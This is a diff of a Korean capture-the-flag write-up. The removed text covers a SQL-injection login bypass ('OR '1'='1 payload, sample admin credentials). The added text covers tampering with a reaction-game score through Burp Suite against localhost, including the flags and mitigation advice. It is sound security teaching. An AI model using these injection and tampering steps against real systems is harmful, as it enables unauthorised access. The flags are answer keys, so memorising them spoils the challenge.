@@ -1,52 +1,83 @@
-
 # 1. 문제 분석
 ## 1.1 문제 설명
-로그인 폼이 있는 웹 페이지  
-SQL Injection 취약점이 존재  
-admin 계정으로 로그인하면 플래그 획득 가능  
+반응속도를 테스트하는 웹 게임  
+100ms 미만의 반응속도를 달성하면 플래그 획득 가능  
+클라이언트-서버 통신을 통해 기록을 검증  
 
-# 2. 공격 방법
-## 2.1 SQL 구문 오류 확인
-아이디 입력창에 작은따옴표(') 입력  
-SQL 구문 오류 메시지 확인  
-SQL Injection 취약점 존재 확인됨  
+# 2. 취약점 분석
+## 2.1 통신 구조 확인
+- 클라이언트(JavaScript)에서 반응 속도 측정
+- 측정된 시간을 서버(PHP)로 전송
+- 서버에서 플래그 반환 여부 결정
 
-## 2.2 테이블 정보 조회
-information_schema 또는 show tables 구문 사용  
-데이터베이스 테이블 구조 확인  
-users 테이블 존재 확인  
+## 2.2 취약점 발견
+- 클라이언트에서 서버로 전송되는 score 값 조작 가능
+- 서버 측에서 충분한 검증 없이 score 값 신뢰
+- HTTP 요청 변조를 통한 공격 가능
 
-##  2.3 사용자 정보 조회
-SELECT * FROM users 구문으로 사용자 정보 조회  
-admin 계정 정보 확인: 
-``` 
-username: admin  
-password: admin123
-isAdmin: true
+# 3. Burp Suite를 이용한 공격
+## 3.1 Burp Suite 설정
+1. Proxy 탭에서 Intercept 켜기
+2. 브라우저에서 Burp Suite 프록시 설정
+3. 게임 페이지 로드 및 통신 감시
+
+## 3.2 요청 분석
+```http
+POST /question6.php HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 13
+
+{"score": 150}
 ```
 
-## 2.4 SQL Injection 공격
-' OR '1'='1 구문으로 로그인 우회 시도  
-쿼리 실행 결과가 TRUE로 반환됨  
-전체 사용자 데이터 접근 가능  
+## 3.3 요청 변조
+1. Intercept 기능으로 POST 요청 캡처
+2. score 값을 99로 변조:
+```http
+POST /question6.php HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 12
 
-## 3. 플래그 획득
-admin/admin123 계정으로 로그인  
-관리자 권한 확인  
-플래그 획득: flag{sql_injection_success}  
-
-## 4. 취약점 설명
-사용자 입력값이 SQL 쿼리에 직접 삽입됨  
-입력값 검증이 불충분  
-SQL Injection 공격에 취약  
-
-## 5. 보안 대책
-입력값 검증 및 이스케이프 처리  
-준비된 구문(Prepared Statement) 사용  
-서버 측에서의 보안 검증 강화  
-최소 권한 원칙 적용  
-
-## 6. 최종 플래그
+{"score": 99}
 ```
-flag{sql_injection_success}
+3. 변조된 요청 전송
+
+## 3.4 응답 확인
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+    "success": true,
+    "message": "점수가 저장되었습니다.",
+    "score": 99,
+    "flag": "FLAG{F4st_R3fl3x_M4st3r}"
+}
+```
+
+# 4. 취약점 원인
+## 4.1 클라이언트 측 검증 한계
+- JavaScript로 측정된 시간은 조작 가능
+- 클라이언트에서 생성된 데이터는 신뢰할 수 없음
+
+## 4.2 서버 측 검증 부재
+- 비정상적인 반응 시간에 대한 검증 부족
+- 클라이언트 데이터를 그대로 신뢰
+
+# 5. 대응 방안
+## 5.1 서버 측 검증 강화
+- 비정상적인 반응 시간 필터링
+- 연속된 요청에 대한 제한
+- 클라이언트 행동 패턴 분석
+
+## 5.2 보안 기능 추가
+- 요청에 대한 서명 검증
+- 시간 기반 토큰 사용
+- 서버 측에서 타임스탬프 검증
+
+# 6. 최종 플래그
+```
+FLAG{F4st_R3fl3x_M4st3r}
 ```
